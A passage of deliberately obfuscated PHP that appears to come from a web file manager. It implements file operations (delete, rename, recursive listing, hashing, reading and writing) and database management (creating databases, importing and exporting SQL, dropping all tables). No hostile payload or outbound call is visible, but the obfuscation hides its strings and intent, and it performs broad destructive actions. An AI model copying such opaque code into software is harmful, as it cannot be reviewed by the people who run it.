ƒ)); $©‡Ù§»Æ = file_exists($ßü‹Æ ƒ); return $©‡Ù§»Æ ? $this->getPathOuter($ßü‹Æ ƒ) : !1; } public function delFile($Á§ùûˆ) { $Á§ùûˆ = $this->iconvSystem($Á§ùûˆ); if (!@unlink($Á§ùûˆ)) { @chmod($Á§ùûˆ, $this->pathAuth); if (!@unlink($Á§ùûˆ)) { return !1; } } else { return !0; } } public function delFolder($Îƒ‚Õš§) { $ã‘ï›—ë =& $_SERVER[­á Ş³Ö]; $Îƒ‚Õš§ = $this->iconvSystem($Îƒ‚Õš§); if (!is_dir($Îƒ‚Õš§)) { return !0; } if (!($â¨Ùá°Š = opendir($Îƒ‚Õš§))) { return !1; } while (($óüğ±ˆ§ = readdir($â¨Ùá°Š)) !== !1) { if ($óüğ±ˆ§ == $ã‘ï›—ë[10] || $óüğ±ˆ§ == $ã‘ï›—ë[1382]) { continue; } $¹Äİé¼´ = $Îƒ‚Õš§ . $ã‘ï›—ë[8] . $óüğ±ˆ§; if (is_file($¹Äİé¼´) || is_link($¹Äİé¼´)) { if (!unlink($¹Äİé¼´)) { chmod($¹Äİé¼´, $this->pathAuth); if (!unlink($¹Äİé¼´)) { return !1; } } } else { if (is_dir($¹Äİé¼´)) { chmod($¹Äİé¼´, $this->pathAuth); $¹Äİé¼´ = $this->iconvApp($¹Äİé¼´); if (!$this->delFolder($¹Äİé¼´)) { return !1; } } } } closedir($â¨Ùá°Š); return rmdir($Îƒ‚Õš§); } public function rename($Ø—ÚÂô˜, $…Ä†ÌÊ) { $¯İÉ–Ä¬ =& $_SERVER[­á Ş³Ö]; $ÅíòÖï = $this->fileNameAuto($this->pathFather($Ø—ÚÂô˜), $…Ä†ÌÊ); $ÅíòÖï = $this->iconvSystem($ÅíòÖï); $Ø—ÚÂô˜ = $this->iconvSystem($Ø—ÚÂô˜); $´ä±÷ˆ = $this->pathFather($Ø—ÚÂô˜); $ÃôË‡¨€ = rtrim($´ä±÷ˆ, $¯İÉ–Ä¬[8]) . $¯İÉ–Ä¬[8] . $ÅíòÖï; $¥©ı§Ñø = @rename($Ø—ÚÂô˜, $ÃôË‡¨€); $ÃôË‡¨€ = $this->iconvApp($ÃôË‡¨€); return $¥©ı§Ñø ? $this->getPathOuter($ÃôË‡¨€) : !1; } public function size($ª˜î§¦Ñ) { $ª˜î§¦Ñ = $this->iconvSystem($ª˜î§¦Ñ); return filesize_64($ª˜î§¦Ñ); } public function info($Ö·¡–Ú) { $Ö·¡–Ú = $this->iconvSystem($Ö·¡–Ú); if ($this->isFolder($Ö·¡–Ú)) { return $this->folderInfo($Ö·¡–Ú); } else { if ($this->isFile($Ö·¡–Ú)) { return $this->fileInfo($Ö·¡–Ú); } } return !1; } protected function infoChildren($—®«­È, &$—»¡Ãª§, $®ŠÎ„Ë = true) { $¨Ã‘Ú‚Õ =& $_SERVER[­á Ş³Ö]; check_abort_echo(); $—®«­È = rtrim($—®«­È, $¨Ã‘Ú‚Õ[8]) . $¨Ã‘Ú‚Õ[8]; if ($®ŠÎ„Ë) { $—®«­È = $this->iconvSystem($—®«­È); } if (!($‰÷¿˜Ìğ = @opendir($—®«­È))) { return; } while (($°îı±†› = readdir($‰÷¿˜Ìğ)) !== !1) { if ($°îı±†› == $¨Ã‘Ú‚Õ[10] || $°îı±†› == $¨Ã‘Ú‚Õ[1382]) { continue; } $òèƒÛÏ­ = $—®«­È . $°îı±†›; if (is_file($òèƒÛÏ­) || is_link($òèƒÛÏ­)) { $—»¡Ãª§[$¨Ã‘Ú‚Õ[77]]++; $—»¡Ãª§[$¨Ã‘Ú‚Õ[76]] += filesize_64($òèƒÛÏ­); } else { if (is_dir($òèƒÛÏ­)) { $—»¡Ãª§[$¨Ã‘Ú‚Õ[78]]++; $this->infoChildren($òèƒÛÏ­, $—»¡Ãª§, !1); } } } closedir($‰÷¿˜Ìğ); } private function folderInfo($èúÅîƒÕ, $ØÃƒ·¹Ç = false) { $Û±ÅÂÖ =& $_SERVER[­á Ş³Ö]; $èúÅîƒÕ = rtrim($èúÅîƒÕ, $Û±ÅÂÖ[8]) . $Û±ÅÂÖ[8]; $÷è¸ìø© = $this->iconvApp($this->pathThis($èúÅîƒÕ)); if ($ØÃƒ·¹Ç) { return array($Û±ÅÂÖ[32] => $÷è¸ìø©, $Û±ÅÂÖ[84] => $this->getPathOuter($èúÅîƒÕ), $Û±ÅÂÖ[33] => $Û±ÅÂÖ[75]); } $¹€şœ¢š = array($Û±ÅÂÖ[32] => $÷è¸ìø©, $Û±ÅÂÖ[84] => $this->getPathOuter($èúÅîƒÕ), $Û±ÅÂÖ[33] => $Û±ÅÂÖ[75], $Û±ÅÂÖ[201] => @filectime($èúÅîƒÕ), $Û±ÅÂÖ[85] => @filemtime($èúÅîƒÕ), $Û±ÅÂÖ[1385] => @fileatime($èúÅîƒÕ), $Û±ÅÂÖ[1386] => is_readable($èúÅîƒÕ), $Û±ÅÂÖ[1387] => is_writable($èúÅîƒÕ), $Û±ÅÂÖ[1388] => get_mode($èúÅîƒÕ)); return $¹€şœ¢š; } private function fileInfo($öâÏ’ã, $°êÍÃ£ = false) { $È´’Ùñ¢ =& $_SERVER[­á Ş³Ö]; $ùáÙäòŞ = $this->iconvApp($this->pathThis($öâÏ’ã)); if ($°êÍÃ£) { return array($È´’Ùñ¢[32] => $ùáÙäòŞ, $È´’Ùñ¢[84] => $this->getPathOuter($öâÏ’ã), $È´’Ùñ¢[33] => $È´’Ùñ¢[200], $È´’Ùñ¢[76] => $this->size($öâÏ’ã), $È´’Ùñ¢[174] => $this->ext($ùáÙäòŞ)); } $åŒ€Í“ó = array($È´’Ùñ¢[32] => $ùáÙäòŞ, $È´’Ùñ¢[84] => $this->getPathOuter($öâÏ’ã), $È´’Ùñ¢[33] => $È´’Ùñ¢[200], $È´’Ùñ¢[201] => @filectime($öâÏ’ã), $È´’Ùñ¢[85] => @filemtime($öâÏ’ã), $È´’Ùñ¢[1385] => @fileatime($öâÏ’ã), $È´’Ùñ¢[76] => $this->size($öâÏ’ã), $È´’Ùñ¢[174] => $this->ext($ùáÙäòŞ), $È´’Ùñ¢[1386] => is_readable($öâÏ’ã), $È´’Ùñ¢[1387] => is_writable($öâÏ’ã), $È´’Ùñ¢[1388] => get_mode($öâÏ’ã)); return $åŒ€Í“ó; } public function exist($†ã¨ºµÓ) { $†ã¨ºµÓ = $this->iconvSystem($†ã¨ºµÓ); return @file_exists($†ã¨ºµÓ); } public function isFile($ğ˜¥ÖÁ) { $ğ˜¥ÖÁ = $this->iconvSystem($ğ˜¥ÖÁ); return @is_file($ğ˜¥ÖÁ); } public function isFolder($×Ç©½Ì) { $×Ç©½Ì = $this->iconvSystem($×Ç©½Ì); return @is_dir($×Ç©½Ì); } public function listPath($×Æ¸Â¶ì, $ÓÎ±ÊÁ = false) { $ä”ƒ²ê =& $_SERVER[­á Ş³Ö]; $×Æ¸Â¶ì = $this->iconvSystem($×Æ¸Â¶ì); $×Æ¸Â¶ì = rtrim($×Æ¸Â¶ì, $ä”ƒ²ê[8]) . $ä”ƒ²ê[8]; $äÄÓğ¸ = array($ä”ƒ²ê[82] => array(), $ä”ƒ²ê[83] => array()); if (!($•œ§İˆŠ = @opendir($×Æ¸Â¶ì))) { return $äÄÓğ¸; } while (($¾Ñ‰—Ğ = readdir($•œ§İˆŠ)) !== !1) { if ($¾Ñ‰—Ğ == $ä”ƒ²ê[10] || $¾Ñ‰—Ğ == $ä”ƒ²ê[1382]) { continue; } $Îõ¯½¸Ô = $×Æ¸Â¶ì . $¾Ñ‰—Ğ; if (is_file($Îõ¯½¸Ô)) { $äÄÓğ¸[$ä”ƒ²ê[83]][] = $this->fileInfo($Îõ¯½¸Ô, $ÓÎ±ÊÁ); } else { $äÄÓğ¸[$ä”ƒ²ê[82]][] = $this->folderInfo($Îõ¯½¸Ô, $ÓÎ±ÊÁ); } } closedir($•œ§İˆŠ); return $äÄÓğ¸; } public function listAll($´İÛ€›, &$©üÒ¿¬½ = array()) { $àúÈõ®Ú =& $_SERVER[­á Ş³Ö]; $´İÛ€› = $this->iconvSystem($´İÛ€›); $´İÛ€› = rtrim($´İÛ€›, $àúÈõ®Ú[8]) . $àúÈõ®Ú[8]; if (!($½„³¤¡ = @opendir($´İÛ€›))) { return $©üÒ¿¬½; } while (($Õ•ô˜Ë£ = readdir($½„³¤¡)) !== !1) { if ($Õ•ô˜Ë£ == $àúÈõ®Ú[10] || $Õ•ô˜Ë£ == $àúÈõ®Ú[1382]) { continue; } $ÚÚ´ì„“ = $´İÛ€› . $Õ•ô˜Ë£; $ş®èÇÒÆ = is_dir($ÚÚ´ì„“) && !is_link($ÚÚ´ì„“) ? 1 : 0; $ÚÚ´ì„“ = $ş®èÇÒÆ ? $ÚÚ´ì„“ . $àúÈõ®Ú[8] : $ÚÚ´ì„“; $©üÒ¿¬½[] = array($àúÈõ®Ú[84] => $ÚÚ´ì„“, $àúÈõ®Ú[75] => $ş®èÇÒÆ, $àúÈõ®Ú[85] => intval(@filemtime($ÚÚ´ì„“)), $àúÈõ®Ú[76] => $ş®èÇÒÆ ? 0 : intval($this->size($ÚÚ´ì„“))); if ($ş®èÇÒÆ) { $this->listAll($ÚÚ´ì„“, $©üÒ¿¬½); } } closedir($½„³¤¡); return $©üÒ¿¬½; } public function has($Æ‚ƒ××, $¹åî€œ¯ = false, $ˆÓÂÄûş = true) { $Â»¥Í =& $_SERVER[­á Ş³Ö]; $Æ‚ƒ×× = $this->iconvSystem($Æ‚ƒ××); $Æ‚ƒ×× = rtrim($Æ‚ƒ××, $Â»¥Í[8]) . $Â»¥Í[8]; if (!($Ó‡Ğ¾¨Õ = @opendir($Æ‚ƒ××))) { return !1; } $†ŞùÉà† = 0; $«œ†Ù”Õ = 0; $¾ÔËã¹À = 0; while (($¼ÍàÜÙÌ = readdir($Ó‡Ğ¾¨Õ)) !== !1) { if ($¼ÍàÜÙÌ == $Â»¥Í[10] || $¼ÍàÜÙÌ == $Â»¥Í[1382]) { continue; } $Û«¼Öú = $Æ‚ƒ×× . $¼ÍàÜÙÌ; if ($¹åî€œ¯) { $¾ÔËã¹À++; if (@is_file($Û«¼Öú)) { $†ŞùÉà†++; } else { $«œ†Ù”Õ++; } if ($¾ÔËã¹À > 10000) { break; } continue; } if ($ˆÓÂÄûş) { if (@is_file($Û«¼Öú)) { return !0; } } else { if (@is_dir($Û«¼Öú . $Â»¥Í[8])) { return !0; } } } closedir($Ó‡Ğ¾¨Õ); if ($¹åî€œ¯) { return array($Â»¥Í[207] => $†ŞùÉà†, $Â»¥Í[208] => $«œ†Ù”Õ); } return !1; } public function hashSimple($Ò† ÁàŠ) { $ÅÄşŸÍˆ =& $_SERVER[­á Ş³Ö]; if (!$Ò† ÁàŠ) { return md5($ÅÄşŸÍˆ[12]); } $Ò† ÁàŠ = $this->iconvSystem($Ò† ÁàŠ); $©–Ø´şÕ = $this->size($Ò† ÁàŠ); $†³ë‰Ìä = 200; $ŞúÕÜóî = 50; if ($©–Ø´şÕ <= $†³ë‰Ìä * $ŞúÕÜóî) { return $this->hashMd5($Ò† ÁàŠ) . $©–Ø´şÕ; } $úäé‘ú€ = $ÅÄşŸÍˆ[12]; $Ó¢¾÷ÌĞ = intval($©–Ø´şÕ / $ŞúÕÜóî); $™°©šœ¨ = fopen($Ò† ÁàŠ, $ÅÄşŸÍˆ[1389]); if (!$™°©šœ¨) { return $úäé‘ú€; } for ($ú´««˜ª = 0; $ú´««˜ª < $ŞúÕÜóî; $ú´««˜ª++) { fseek_64($™°©šœ¨, $Ó¢¾÷ÌĞ * $ú´««˜ª); $úäé‘ú€ .= fread($™°©šœ¨, $†³ë‰Ìä); } fseek_64($™°©šœ¨, $©–Ø´şÕ - $†³ë‰Ìä); $úäé‘ú€ .= fread($™°©šœ¨, $†³ë‰Ìä); fclose($™°©šœ¨); return md5($úäé‘ú€) . $©–Ø´şÕ; } public function getContent($»šŞÎ»Ö) { $»šŞÎ»Ö = $this->iconvSystem($»šŞÎ»Ö); return file_get_contents($»šŞÎ»Ö); } public function setContent($¥¡üù’­, $ÂŠÊà” = '') { $¥¡üù’­ = $this->iconvSystem($¥¡üù’­); $ëÆö¨  = @file_put_contents($¥¡üù’­, $ÂŠÊà”, LOCK_EX); clearstatcache(); @chmod($¥¡üù’­, $this->pathAuth); return $ëÆö¨  === !1 ? !1 : !0; } public function fileSubstr($×›­ñÁˆ, $¼èíŒŞç = 0, $‰´¹ı¯Í = false) { $–« øÔ€ =& $_SERVER[­á Ş³Ö]; $×›­ñÁˆ = $this->iconvSystem($×›­ñÁˆ); if ($‰´¹ı¯Í === !1) { $‰´¹ı¯Í = $this->size($×›­ñÁˆ); } if ($‰´¹ı¯Í <= 0) { return $–« øÔ€[12]; } $…öÎäÌ× = fopen($×›­ñÁˆ, $–« øÔ€[1389]); if (!$…öÎäÌ×) { return !1; } fseek_64($…öÎäÌ×, $¼èíŒŞç); $£½¼¼½ = fread($…öÎäÌ×, $‰´¹ı¯Í); fclose($…öÎäÌ×); return $£½¼¼½; } public function upload($Ü´ã˜úœ, $Ã§Áş, $¹Ş›†“ = false, $‘Ë°‚ = REPEAT_REPLACE) { if ($¹Ş›†“) { return $this->moveFile($Ã§Áş, $Ü´ã˜úœ); } return $this->copyFile($Ã§Áş, $Ü´ã˜úœ); } public function setModifyTime($ ÎÌ®ÜÖ, $ÛŒˆ»İÁ = '') { @touch($ ÎÌ®ÜÖ, intval($ÛŒˆ»İÁ)); } public function download($’·ÂÊù, $ìßâèÛ) { return $this->iconvSystem($’·ÂÊù); } } goto C©•¬«Ø¾; föÜÆôù: class DbManage { function __construct($üØŸÒ–Û = array()) { $­ÄæÅÛ§ =& $_SERVER[­á Ş³Ö]; if (empty($üØŸÒ–Û)) { $üØŸÒ–Û = $GLOBALS[$­ÄæÅÛ§[6]][$­ÄæÅÛ§[21]]; } $this->database = $üØŸÒ–Û; } public function model($±º©ÁÑû = '') { return new ModelBase($±º©ÁÑû, $_SERVER[­á Ş³Ö][12], $this->database); } public function db($«Ò¢ğü¤ = false) { $•›ÓÂÚ‡ =& $_SERVER[­á Ş³Ö]; $‰—ù¡ĞÆ = array_change_key_case($this->database); if ($this->dbType() == $•›ÓÂÚ‡[13] || !$«Ò¢ğü¤) { return $this->model()->db(); } $ğŸì­Û = $‰—ù¡ĞÆ[$•›ÓÂÚ‡[968]]; $‰—ù¡ĞÆ[$•›ÓÂÚ‡[968]] = $•›ÓÂÚ‡[12]; if ($‰—ù¡ĞÆ[$•›ÓÂÚ‡[963]] == $•›ÓÂÚ‡[960]) { $í¿¿¸ä˜ = $‰—ù¡ĞÆ[$•›ÓÂÚ‡[969]]; $‰—ù¡ĞÆ[$•›ÓÂÚ‡[969]] = substr($í¿¿¸ä˜, 0, strrpos($í¿¿¸ä˜, $•›ÓÂÚ‡[1055])); } $this->database = $‰—ù¡ĞÆ; $âá‡·ç = $this->model()->db(); try { $¥³åÏÔ¥ = $âá‡·ç->execute("\163\x68\x6f\x77\40\x64\141\x74\x61\142\x61\163\145\x73\x20\x6c\151\153\x65\x20\47{$ğŸì­Û}\47"); } catch (Exception $èáøğç¤) { } if (!$¥³åÏÔ¥) { $âá‡·ç->execute("\143\162\x65\x61\x74\145\x20\144\141\x74\x61\x62\141\163\145\x20\x60{$ğŸì­Û}\140"); } $‰—ù¡ĞÆ[$•›ÓÂÚ‡[968]] = $ğŸì­Û; if ($‰—ù¡ĞÆ[$•›ÓÂÚ‡[963]] == $•›ÓÂÚ‡[960]) { $‰—ù¡ĞÆ[$•›ÓÂÚ‡[969]] .= $•›ÓÂÚ‡[1055] . $ğŸì­Û; } $this->database = $‰—ù¡ĞÆ; $âá‡·ç->execute("\x75\163\145\x20\140{$ğŸì­Û}\140"); return $âá‡·ç; } public function createTable($‡ı®Ìş, &$À³ÀŒº¼) { $·³•Ğ‰‹ =& $_SERVER[­á Ş³Ö]; if (!IO::exist($‡ı®Ìş)) { ActionCall($·³•Ğ‰‹[1056], !0, 0); show_json(LNG($·³•Ğ‰‹[1057]), !1); } $‚‰½ú¡Æ = $this->model()->db(); $šõìôúª = sqlSplit(IO::getContent($‡ı®Ìş)); foreach ($šõìôúª as $¸ï‚€Ûç) { $‘í´§‡º = stripos($¸ï‚€Ûç, $·³•Ğ‰‹[1058]) === 0; if ($‘í´§‡º) { $À³ÀŒº¼->task[$·³•Ğ‰‹[783]] += 1; } $‚‰½ú¡Æ->execute($¸ï‚€Ûç); if ($‘í´§‡º) { preg_match($·³•Ğ‰‹[1059], $¸ï‚€Ûç, $äşÔÖÙ•); $À³ÀŒº¼->task[$·³•Ğ‰‹[1060]] = $äşÔÖÙ•[1]; $À³ÀŒº¼->update(1); } } } public function insertTable($ÓÒÈÓì, &$ßÖ›¥Öô) { $·áâ« =& $_SERVER[­á Ş³Ö]; $‰İá¯Â³ = $this->model()->db(); $ï¿ÈË²‡ = $ŞÏ¹£Å€ ? array($ŞÏ¹£Å€) : $‰İá¯Â³->getTables(); foreach ($ÓÒÈÓì as $»¿ µÚ¨) { $ŞÏ¹£Å€ = basename($»¿ µÚ¨, $·áâ«[785]); if (!in_array($ŞÏ¹£Å€, $ï¿ÈË²‡)) { continue; } $ßÖ›¥Öô->task[$·áâ«[1060]] = $ŞÏ¹£Å€; if (get_filesize($»¿ µÚ¨) == 0) { continue; } $©ÕŠ™Şœ = $this->sqlToDb($»¿ µÚ¨, $ßÖ›¥Öô); if (!$©ÕŠ™Şœ) { ActionCall($·áâ«[1056], !0, 0); show_json(LNG($·áâ«[1061]) . "\133{$ŞÏ¹£Å€}\135", !1); } } } public function sqlFromDb($ãâ÷ÍÊ, $Ş…›²ìÔ, &$ÃûØ­ùª, $©áûâ® = '') { if ($ÃûØ­ùª) { $ÃûØ­ùª->task[$_SERVER[­á Ş³Ö][1060]] = $ãâ÷ÍÊ; } $²ù½ºÛÖ = $this->model($ãâ÷ÍÊ); $ñ³»˜Ñ° = 0; $›ÁÏ²»¥ = 0; $ò óşÚñ = 10000; $Ğ¿É¼¹‹ = fopen($Ş…›²ìÔ, $_SERVER[­á Ş³Ö][1062]); $Ş·ïÄ¥® = $²ù½ºÛÖ->getPk(); $İêıß‹Ñ = $²ù½ºÛÖ->getDbFields(); $÷ğËÁŠË = $_SERVER[­á Ş³Ö][12]; if ($GLOBALS[$_SERVER[­á Ş³Ö][784]] && in_array($ãâ÷ÍÊ, array($_SERVER[­á Ş³Ö][1063], $_SERVER[­á Ş³Ö][1064]))) { $÷ğËÁŠË = $ãâ÷ÍÊ; } do { $º†Â›— = array($Ş·ïÄ¥® => array($_SERVER[­á Ş³Ö][1010], $›ÁÏ²»¥)); $ú•ÁÛø = $²ù½ºÛÖ->where($º†Â›—)->field($İêıß‹Ñ)->order($Ş·ïÄ¥® . $_SERVER[­á Ş³Ö][1065])->limit($ò óşÚñ)->select(); $ú•ÁÛø = !empty($ú•ÁÛø) ? $ú•ÁÛø : array(); if (!($Í›óÇâ = count($ú•ÁÛø))) { break; } $­Ë¸üÒ£ = end($ú•ÁÛø); $›ÁÏ²»¥ = $­Ë¸üÒ£[$Ş·ïÄ¥®]; $Ü•†¥ğĞ = array(); foreach ($ú•ÁÛø as $­á±) { if ($÷ğËÁŠË) { if ($ãâ÷ÍÊ == $_SERVER[­á Ş³Ö][1063]) { if ($­á±[$_SERVER[­á Ş³Ö][33]] == $_SERVER[­á Ş³Ö][1066]) { $œ‰ç÷¬Ë = json_decode($­á±[$_SERVER[­á Ş³Ö][374]], !0); if ($œ‰ç÷¬Ë[$_SERVER[­á Ş³Ö][32]] == $GLOBALS[$_SERVER[­á Ş³Ö][784]] && $œ‰ç÷¬Ë[$_SERVER[­á Ş³Ö][746]] != 1) { continue; } } } else { if ($­á±[$_SERVER[­á Ş³Ö][33]] == $_SERVER[­á Ş³Ö][1067] && $­á±[$_SERVER[­á Ş³Ö][94]] == $_SERVER[­á Ş³Ö][776]) { continue; } } } if ($©áûâ®) { $­á±[$_SERVER[­á Ş³Ö][84]] = "\x7b\x69\157\x3a{$©áûâ®}\175" . substr($­á±[$_SERVER[­á Ş³Ö][84]], strlen("\173\x69\x6f\72{$­á±[$_SERVER[­á Ş³Ö][814]]}\175")); $­á±[$_SERVER[­á Ş³Ö][814]] = $©áûâ®; } $Ü•†¥ğĞ[] = $_SERVER[­á Ş³Ö][1068] . $this->sqlEncode($­á±) . $_SERVER[­á Ş³Ö][1069]; } $í°ßÜ–í = "\x49\116\123\x45\122\124\40\x49\x4e\x54\x4f\40\140{$ãâ÷ÍÊ}\x60\40\x28\x60" . implode($_SERVER[­á Ş³Ö][1070], $İêıß‹Ñ) . $_SERVER[­á Ş³Ö][1071]; fwrite($Ğ¿É¼¹‹, $í°ßÜ–í . implode($_SERVER[­á Ş³Ö][1072], $Ü•†¥ğĞ) . $_SERVER[­á Ş³Ö][71] . PHP_EOL); $ñ³»˜Ñ° += $Í›óÇâ; if ($ÃûØ­ùª) { $ÃûØ­ùª->update($Í›óÇâ); } } while ($ò óşÚñ == $Í›óÇâ); fclose($Ğ¿É¼¹‹); return $ñ³»˜Ñ°; } public function sqlToDb($Œ²¢Ãš, &$Öä³Öîò) { $€ÒÉ´—õ =& $_SERVER[­á Ş³Ö]; $Ñˆí•±’ = $this->model()->db(); $šˆÓù³ = @fopen($Œ²¢Ãš, $€ÒÉ´—õ[1073]); if (!$šˆÓù³) { return !1; } $Ê¸üÁÎê = 0; $“¡Šê¼ = $€ÒÉ´—õ[12]; $ô„ÙşÄ = array(); $¹‚¤Ÿ¾Ÿ = $this->dbType(); $Ú±”˜àí = $¹‚¤Ÿ¾Ÿ == $€ÒÉ´—õ[13] ? 500 : 2000; $óšœšå¸ = basename($Œ²¢Ãš, $€ÒÉ´—õ[785]); $ŒÈŒ‘ = 0; $ƒ±¿·¿ˆ = 4194304 - 104858; $Ş±™ŞçÍ = 1000000 - 104858; while (!feof($šˆÓù³)) { $‚ã«Ô¡Á = trim(fgets($šˆÓù³)); if (!$‚ã«Ô¡Á) { continue; } $û ¸ê—¥ = $this->sqlDecode($‚ã«Ô¡Á, $¹‚¤Ÿ¾Ÿ, $óšœšå¸); if (stripos($û ¸ê—¥, $€ÒÉ´—õ[355]) === 0) { if (!$“¡Šê¼) { $“¡Šê¼ = $û ¸ê—¥ . $€ÒÉ´—õ[53]; } continue; } if ($Öä³Öîò) { $Öä³Öîò->task[$€ÒÉ´—õ[783]] += 1; } $Ê¸üÁÎê++; $ô„ÙşÄ[] = rtrim(rtrim(trim($û ¸ê—¥), $€ÒÉ´—õ[50]), $€ÒÉ´—õ[71]); $÷ãŒ·‡à = null; $­œ›¥ñÌ = strlen($û ¸ê—¥); $ŒÈŒ‘ += $­œ›¥ñÌ; if ($ŒÈŒ‘ >= ($Ú±”˜àí == 500 ? $Ş±™ŞçÍ : $ƒ±¿·¿ˆ)) { $÷ãŒ·‡à = array_pop($ô„ÙşÄ); if ($Ê¸üÁÎê > 1) { $Ê¸üÁÎê--; } } if ($Ê¸üÁÎê >= $Ú±”˜àí || $÷ãŒ·‡à) { $û ¸ê—¥ = $“¡Šê¼ . implode($€ÒÉ´—õ[50], $ô„ÙşÄ); if (!$Ñˆí•±’->execute($û ¸ê—¥)) { return !1; } if ($Öä³Öîò) { $Öä³Öîò->update($Ê¸üÁÎê); } $ô„ÙşÄ = array(); $Ê¸üÁÎê = 0; $ŒÈŒ‘ = 0; if ($÷ãŒ·‡à) { $ô„ÙşÄ = array($÷ãŒ·‡à); $Ê¸üÁÎê = 1; $ŒÈŒ‘ = $­œ›¥ñÌ; } } } fclose($šˆÓù³); if (!empty($ô„ÙşÄ)) { $û ¸ê—¥ = $“¡Šê¼ . implode($€ÒÉ´—õ[50], $ô„ÙşÄ); if (!$Ñˆí•±’->execute($û ¸ê—¥)) { return !1; } if ($Öä³Öîò) { $Öä³Öîò->update($Ê¸üÁÎê); } } return !0; } public function dropTable($êäĞ›±Æ = null) { $¹ÊÔç… = $this->model()->db(); $ÏëïãË‹ = $êäĞ›±Æ ? array($êäĞ›±Æ) : $¹ÊÔç…->getTables(); if (!$ÏëïãË‹) { return; } foreach ($ÏëïãË‹ as $êäĞ›±Æ) { if ($êäĞ›±Æ) { $êäĞ›±Æ = strtolower($êäĞ›±Æ); } else { continue; } $¹ÊÔç…->execute("\x64\x72\x6f\x70\x20\x74\x61\142\154\145\40\x69\146\40\145\x78\x69\163\x74\x73\40\140{$êäĞ›±Æ}\x60"); } } private function sqlEncode($İ…°Áäš) { $ÏßŠò¸ä =& $_SERVER[­á Ş³Ö]; $â«“Ú¶ = array(); foreach ($İ…°Áäš as $ÖŒÎªÕ´) { if (is_array($ÖŒÎªÕ´)) { $ÖŒÎªÕ´ = json_encode_force($ÖŒÎªÕ´); } $ÖŒÎªÕ´ = addslashes($ÖŒÎªÕ´); $ÖŒÎªÕ´ = str_replace(array($ÏßŠò¸ä[1074], $ÏßŠò¸ä[231]), array($ÏßŠò¸ä[1075], $ÏßŠò¸ä[1076]), $ÖŒÎªÕ´); $â«“Ú¶[] = str_replace($ÏßŠò¸ä[58], $ÏßŠò¸ä[1077], $ÖŒÎªÕ´); } return $ÏßŠò¸ä[58] . implode($ÏßŠò¸ä[1078], $â«“Ú¶) . $ÏßŠò¸ä[58]; } private function sqlDecode($¯éßˆÀ‘, $Ï›¸™ÛŒ, $ÓˆŞ¹­¶ = '') { $”›ôßŸ¦ =& $_SERVER[­á Ş³Ö]; $¯éßˆÀ‘ = str_replace(array($”›ôßŸ¦[1075], $”›ôßŸ¦[1076]), array($”›ôßŸ¦[1074], $”›ôßŸ¦[231]), $¯éßˆÀ‘); if ($Ï›¸™ÛŒ == $”›ôßŸ¦[13]) { return $ÓˆŞ¹­¶ != $”›ôßŸ¦[1079] ? stripslashes($¯éßˆÀ‘) : $¯éßˆÀ‘; } if ($ÓˆŞ¹­¶ == $”›ôßŸ¦[1079]) { $¯éßˆÀ‘ = str_replace($”›ôßŸ¦[1080], $”›ôßŸ¦[118], stripslashes($¯éßˆÀ‘)); } return $¯éßˆÀ‘; } public function getSqlFile($–£’€ø = '') { $€ñüÓöî =& $_SERVER[­á Ş³Ö]; $ªŒŠïÅÉ = $this->dbType(!0); $ñŠ‘ê  = CONTROLLER_DIR . "\151\156\x73\x74\x61\x6c\x6c\57\x64\x61\164\x61\57{$ªŒŠïÅÉ}\56\x73\x71\x6c"; $½‘€ ‘ö = file_get_contents($ñŠ‘ê ); $êºâñ¶‰ = $€ñüÓöî[1081] . ($ªŒŠïÅÉ == $€ñüÓöî[801] ? $€ñüÓöî[1082] : $€ñüÓöî[1083]) . $€ñüÓöî[1084]; preg_match_all($êºâñ¶‰, $½‘€ ‘ö, $ö­Ÿ”ïš); $îæ‡³ = $ö­Ÿ”ïš[1]; $óÀåšúµ = $this->model()->db(); $“·Õ¥Õ = $óÀåšúµ->getTables(); $¥Ø‚Ş¦¼ = TEMP_FILES . $€ñüÓöî[1085] . date($€ñüÓöî[747]) . $€ñüÓöî[8]; del_dir($¥Ø‚Ş¦¼); mk_dir($¥Ø‚Ş¦¼); $‡Ôò¤•» = $¥Ø‚Ş¦¼ . $€ñüÓöî[1086]; $èº±ªÏ = $¥Ø‚Ş¦¼ . $€ñüÓöî[1087]; $«ğøÛÚ² = $ªŒŠïÅÉ == $€ñüÓöî[13] ? $€ñüÓöî[801] : $€ñüÓöî[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\x74\141\154\154\57\x64\141\x74\141\57{$«ğøÛÚ²}\56\x73\x71\154", $¥Ø‚Ş¦¼); @touch($¥Ø‚Ş¦¼ . $ªŒŠïÅÉ . $€ñüÓöî[785]); $º²äš = fopen($‡Ôò¤•», $€ñüÓöî[1062]); $ÄªˆõÙ = fopen($èº±ªÏ, $€ñüÓöî[1062]); if ($ªŒŠïÅÉ == $€ñüÓöî[13]) { $“·Õ¥Õ = array_diff($“·Õ¥Õ, array($€ñüÓöî[781], $€ñüÓöî[782])); $â×Öº¨ = array($€ñüÓöî[1088], $€ñüÓöî[1089], $€ñüÓöî[1090]); fwrite($ÄªˆõÙ, implode(PHP_EOL, $â×Öº¨) . PHP_EOL . PHP_EOL); foreach ($“·Õ¥Õ as $ÚİüöÃ) { $¸¨íÄä¨ = $this->sqlFromSqlite($ÚİüöÃ); if (!$¸¨íÄä¨[$€ñüÓöî[13]]) { continue; } fwrite($ÄªˆõÙ, $¸¨íÄä¨[$€ñüÓöî[13]] . PHP_EOL . PHP_EOL); if (!in_array($ÚİüöÃ, $îæ‡³)) { fwrite($º²äš, $¸¨íÄä¨[$€ñüÓöî[801]] . PHP_EOL . PHP_EOL); } } } else { foreach ($“·Õ¥Õ as $ÚİüöÃ) { $¸¨íÄä¨ = $this->sqlFromMysql($ÚİüöÃ); if (!$¸¨íÄä¨[$€ñüÓöî[801]]) { continue; } fwrite($º²äš, $¸¨íÄä¨[$€ñüÓöî[801]] . PHP_EOL . PHP_EOL); if (!in_array($ÚİüöÃ, $îæ‡³)) { fwrite($ÄªˆõÙ, $¸¨íÄä¨[$€ñüÓöî[13]] . PHP_EOL . PHP_EOL); } } } fclose($º²äš); fclose($ÄªˆõÙ); $½‘€ ‘ö = array($€ñüÓöî[801] => $‡Ôò¤•», $€ñüÓöî[13] => $èº±ªÏ); return $–£’€ø ? $½‘€ ‘ö[$–£’€ø] : $½‘€ ‘ö; } public function dbType($Œ©œÏÑ = false) { $±¼Õ§€ =& $_SERVER[­á Ş³Ö]; $‘Ì•«¸ = $Œ©œÏÑ ? $GLOBALS[$±¼Õ§€[6]][$±¼Õ§€[21]] : $this->database; $‘Ì•«¸ = array_change_key_case($‘Ì•«¸); $àş¼Ôƒ¯ = 